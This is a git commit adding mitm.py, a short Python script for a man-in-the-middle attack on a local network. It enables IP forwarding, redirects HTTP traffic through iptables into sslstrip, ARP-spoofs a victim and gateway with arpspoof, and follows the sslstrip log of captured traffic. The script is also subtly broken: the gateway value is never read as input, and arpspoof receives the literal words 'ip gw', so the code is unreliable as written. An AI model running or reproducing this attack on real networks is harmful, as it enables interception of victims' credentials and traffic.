11828b102fa9cdbb67a3138427db8f8e8b84683c
Davide <msn_davide@hotmail.it>
2016-12-12 08:59:04 +0100

    Create mitm.py

---
+++ mitm.py
@@ -0,0 +1,15 @@
+#! /usr/bin/env python3
+import os
+import subprocess
+def attack():
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    os.system("iptables -t nat -A PREROUTING -i eth1 -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
+    subprocess.Popen(['sslstrip -p -l 10000'],shell=True)
+    ip = input("enter ip victim : ")
+    gw = ("Enter GateWay :  ")
+    os.system("arpspoof -i eth0 -t ip gw")
+    os.system("tail -f sslstrip.log")
+
+
+if __name__ == '__main__':
+    attack()
